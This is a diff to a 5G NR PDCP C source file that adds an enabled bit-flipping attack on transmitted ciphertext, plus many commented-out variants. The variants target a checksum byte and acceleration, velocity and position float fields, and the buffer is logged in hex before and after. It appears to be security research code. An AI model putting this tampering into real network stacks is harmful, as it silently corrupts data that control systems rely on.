@@ -675,12 +675,189 @@ static void deliver_sdu_drb(void *_ue, nr_pdcp_entity_t *entity,
   }
 }
 
+// enable this when attacking
+static int attack_enable = 1;
+
 static void deliver_pdu_drb_ue(void *deliver_pdu_data, ue_id_t ue_id, int rb_id,
                                char *buf, int size, int sdu_id)
 {
   DevAssert(deliver_pdu_data == NULL);
   protocol_ctxt_t ctxt = { .enb_flag = 0, .rntiMaybeUEid = ue_id };
 
+  //JOON: Print the buffer content as hexadecimal (before attack)
+  LOG_W(PDCP, "(Transmit Ciphertext) %s(): (drb %d), (size %d), Buffer content: UE %ld/%04lx\n", __func__, rb_id, size, ctxt.rntiMaybeUEid, ctxt.rntiMaybeUEid);
+  for (int i = 0; i < size; ++i) {
+    LOG_W(PDCP, "%02x ", (unsigned char)buf[i]);
+  }
+  LOG_W(PDCP, "\n");
+
+  // ***ATTACK STARTS***
+
+  // this only works the first time gNB is launched!
+  if (attack_enable == 1) {
+  
+    // If we transmit 3 float values, the index of checksum bytes in PDU (start from 0) are 29 and 30
+    // //JOON: Flip the last bit in the checksum (31th)
+    // buf[30] ^= 1;
+    
+    // Test for Checksum Bit-FLipping Attack
+    buf[29] ^= (1 << 5);   // mutate checksum
+    buf[31] ^= (1 << 5);   // mutate acc value
+    
+    // // Test for Payload Bit-FLipping Attack
+    // buf[31] ^= (1 << 5);   // mutate acc value
+    // buf[33] ^= (1 << 5);   // mutate vel value
+
+    // buf[32] ^= (1 << 0);   // mutate vel value
+    // buf[34] ^= (1 << 0);   // mutate pos value
+
+    // //JOON: Flip the last bit of the second byte of the acceleration float (36th)
+    // buf[36] ^= 1;
+
+    // ACCELERATION ATTACK
+
+    //JOON: Sign flip attack (first bit of the checksum and acceleration float)
+    // buf[29] ^= (1 << 7);
+    // buf[35] ^= (1 << 7);
+
+    // // JOON: Exponent flip attack 
+    // // second bit (MSB of exp) can give NaN values
+    // buf[29] ^= (1 << 5);
+    // buf[35] ^= (1 << 5);
+
+    // //JOON: Mantissa flip attack (MSB)
+    // buf[30] ^= (1 << 6);
+    // buf[36] ^= (1 << 6);
+
+    // VELOCITY ATTACK
+
+    // //JOON: Sign flip attack (first bit of the checksum and velocity float)
+    // buf[29] ^= (1 << 7);
+    // buf[35+4] ^= (1 << 7);
+
+    // // JOON: Exponent flip attack 
+    // // second bit (MSB of exp) can give NaN values
+    // buf[29] ^= (1 << 5);
+    // buf[35+4] ^= (1 << 5);
+
+    // //JOON: Mantissa flip attack (MSB)
+    // buf[30] ^= (1 << 6);
+    // buf[36+4] ^= (1 << 6);
+
+    // POSITION ATTACK
+
+    // //JOON: Sign flip attack (first bit of the checksum and position float)
+    // buf[29] ^= (1 << 7);
+    // buf[35+8] ^= (1 << 7);
+
+    // // JOON: Exponent flip attack 
+    // // second bit (MSB of exp) can give NaN values
+    // buf[29] ^= (1 << 5);
+    // buf[35+8] ^= (1 << 5);
+
+    // //JOON: Mantissa flip attack (MSB)
+    // buf[30] ^= (1 << 6);
+    // buf[36+8] ^= (1 << 6);
+    
+    // //JOON: Mantissa flip attack (4th MSB)
+    // buf[30] ^= (1 << 3);
+    // buf[36+8] ^= (1 << 3);
+
+    // //JOON: Mantissa flip attack (6th MSB)
+    // buf[30] ^= (1 << 1);
+    // buf[36+8] ^= (1 << 1);
+
+    // TWO-BIT ATTACK
+
+    // //JOON: two-bit attack, not flipping the checksum but two bits in the same position
+    // // this should still result in a 50% success rate
+    // buf[37] ^= (1 << 7);
+    // buf[35] ^= (1 << 7);
+    
+    // ACCELERATION + VELOCITY ATTACK
+
+    // // JOON: acceleration + velocity sign flip attack
+    // buf[35] ^= (1 << 7);
+    // buf[35+4] ^= (1 << 7);
+
+    // // JOON: acceleration + velocity exponent flip attack
+    // buf[35] ^= (1 << 5);
+    // buf[35+4] ^= (1 << 5);
+
+    // // JOON: acceleration + velocity mantissa flip attack
+    // buf[36] ^= (1 << 6);
+    // buf[36+4] ^= (1 << 6);
+
+    // //JOON: Mantissa flip attack (4th MSB)
+    // buf[36] ^= (1 << 3);
+    // buf[36+4] ^= (1 << 3);
+
+    // //JOON: Mantissa flip attack (6th MSB)
+    // buf[36] ^= (1 << 1);
+    // buf[36+4] ^= (1 << 1);
+
+    // ACCELERATION + POSITION ATTACK
+
+    // // JOON: acceleration + position sign flip attack
+    // buf[35] ^= (1 << 7);
+    // buf[35+8] ^= (1 << 7);
+
+    // // JOON: acceleration + position exponent flip attack
+    // buf[35] ^= (1 << 5);
+    // buf[35+8] ^= (1 << 5);
+
+    // // JOON: acceleration + position mantissa flip attack
+    // buf[36] ^= (1 << 6);
+    // buf[36+8] ^= (1 << 6);
+
+    // //JOON: Mantissa flip attack (4th MSB)
+    // buf[36] ^= (1 << 3);
+    // buf[36+8] ^= (1 << 3);
+
+    // //JOON: Mantissa flip attack (6th MSB)
+    // buf[36] ^= (1 << 1);
+    // buf[36+8] ^= (1 << 1);
+
+    // //JOON: Mantissa flip attack (further attacks)
+    // buf[37] ^= (1 << 4);
+    // buf[37+8] ^= (1 << 4);
+
+    // VELOCITY + POSITION ATTACK
+
+    // // JOON: acceleration + position sign flip attack
+    // buf[35+4] ^= (1 << 7);
+    // buf[35+8] ^= (1 << 7);
+
+    // // JOON: acceleration + position exponent flip attack
+    // buf[35+4] ^= (1 << 5);
+    // buf[35+8] ^= (1 << 5);
+
+    // // JOON: acceleration + position mantissa flip attack
+    // buf[36+4] ^= (1 << 6);
+    // buf[36+8] ^= (1 << 6);
+
+    // //JOON: Mantissa flip attack (4th MSB)
+    // buf[36+4] ^= (1 << 3);
+    // buf[36+8] ^= (1 << 3);
+
+    // //JOON: Mantissa flip attack (6th MSB)
+    // buf[36+4] ^= (1 << 1);
+    // buf[36+8] ^= (1 << 1);
+
+    // //JOON: Mantissa flip attack (further attacks)
+    // buf[37+4] ^= (1 << 4);
+    // buf[37+8] ^= (1 << 4);
+
+    //JOON: Print the buffer content as hexadecimal (after attack)
+    LOG_W(PDCP, "(Bit-Flipping Attack on Ciphertext) %s(): (drb %d), (size %d), Buffer content: UE %ld/%04lx\n", __func__, rb_id, size, ctxt.rntiMaybeUEid, ctxt.rntiMaybeUEid);
+    for (int i = 0; i < size; ++i) {
+      LOG_W(PDCP, "%02x ", (unsigned char)buf[i]);
+    }
+    LOG_W(PDCP, "\n");
+  }
+
+  // ***ATTACK ENDS***  
+  
   uint8_t *memblock = malloc16(size);
   memcpy(memblock, buf, size);
   LOG_D(PDCP, "%s(): (drb %d) calling rlc_data_req size %d UE %ld/%04lx\n", __func__, rb_id, size, ctxt.rntiMaybeUEid, ctxt.rntiMaybeUEid);
